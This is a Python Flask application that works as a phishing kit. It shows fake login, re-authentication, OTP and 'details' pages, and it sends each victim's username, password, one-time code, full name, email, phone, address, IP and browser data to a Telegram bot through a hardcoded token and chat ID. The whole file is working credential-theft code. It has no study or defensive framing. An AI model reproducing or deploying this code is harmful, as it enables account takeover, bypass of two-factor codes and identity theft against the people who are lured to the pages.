from flask import Flask, render_template ,url_for , request , redirect
import datetime
import requests

app = Flask(__name__)
application = app 

def visitor_country():
    client_ip = request.headers.get('HTTP_CLIENT_IP', '')
    forwarded_ip = request.headers.get('HTTP_X_FORWARDED_FOR', '')
    remote_ip = request.remote_addr

    ip = remote_ip  
    if client_ip and '.' in client_ip: 
        ip = client_ip
    elif forwarded_ip and '.' in forwarded_ip:
        ip = forwarded_ip

    try:
        response = requests.get(f"http://www.geo_link.net/json.gp?ip={ip}", timeout=5).json()
        return response.get("geoplugin_countryName", "Unknown")
    except:
        return "Unknown"
    
def send_telegram_msg(message):
    bot_token = "8443196447:AAEUbfaEmO_4mgXuhHpsoSKS3poHVIwu56s" 
    chat_id = "7608795325"      
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    data = {"chat_id": chat_id, "text": message}
    requests.post(url, json=data) 


@app.route('/', methods=['GET','POST'])
def index():
    if request.method == 'POST':
        country = visitor_country()
        ip = request.remote_addr
        port = request.environ.get('REMOTE_PORT')
        browser = request.headers.get('User-Agent')
        adddate = datetime.datetime.now().strftime("%a %b %d, %Y %I:%M %p")

        message = "**@dev+++\n"
        message += f"Username : {request.form.get('username', '')}\n"
        message += f"Password : {request.form.get('password', '')}\n"
        message += f"User-!P : {ip}\n"
        message += f"Port-!p : {port}\n"
        message += f"Country : {country}\n\n"
        message += "----------------------------------------\n"
        message += f"Date : {adddate}\n"
        message += f"User-Agent: {browser}\n"
    
        send_telegram_msg(message)
        return redirect('Re-auth')
    return render_template('index.html')



@app.route('/Re-auth', methods=['GET','POST'])
def index2():
    if request.method == 'POST':
        country = visitor_country()
        ip = request.remote_addr
        port = request.environ.get('REMOTE_PORT')
        browser = request.headers.get('User-Agent')
        adddate = datetime.datetime.now().strftime("%a %b %d, %Y %I:%M %p")

        message = "**@dev+++\n"
        message += f"Username : {request.form.get('username', '')}\n"
        message += f"Password : {request.form.get('password', '')}\n"
        message += f"User-!P : {ip}\n"
        message += f"Port-!p : {port}\n"
        message += f"Country : {country}\n\n"
        message += "----------------------------------------\n"
        message += f"Date : {adddate}\n"
        message += f"User-Agent: {browser}\n"
    
        send_telegram_msg(message)
        return redirect(url_for('index3'))
    else:
        return render_template('index2.html')




@app.route('/otp', methods=['GET','POST'])
def index3():
    if request.method == 'POST':
        message = request.form.get('otp', '')
        send_telegram_msg(message)

        return redirect(url_for('personal'))
    else:
        return render_template('otp.html')



@app.route('/details', methods=['GET','POST'])
def personal():
        if request.method == 'POST':
                country = visitor_country()
                ip = request.remote_addr
                port = request.environ.get('REMOTE_PORT')
                browser = request.headers.get('User-Agent')
                adddate = datetime.datetime.now().strftime("%a %b %d, %Y %I:%M %p")

                message = "**@dev+++\n"
                message += f"full name : {request.form.get('fname', '')}\n"
                message += f"email : {request.form.get('email', '')}\n"
                message += f"phone : {request.form.get('phone', '')}\n"
                message += f"address : {request.form.get('address', '')}\n"
                message += f"User-!P : {ip}\n"
                message += f"Port-!p : {port}\n"
                message += f"Country : {country}\n\n"
                message += "----------------------------------------\n"
                message += f"Date : {adddate}\n"
                message += f"User-Agent: {browser}\n"
                send_telegram_msg(message)
                return redirect(url_for('lass'))
        else:
            return render_template('personal.html')



@app.route('/authentication-complete', methods=['GET','POST'])
def lass():
        return render_template('c.html')




if __name__ == "__main__":
    app.run(debug=True)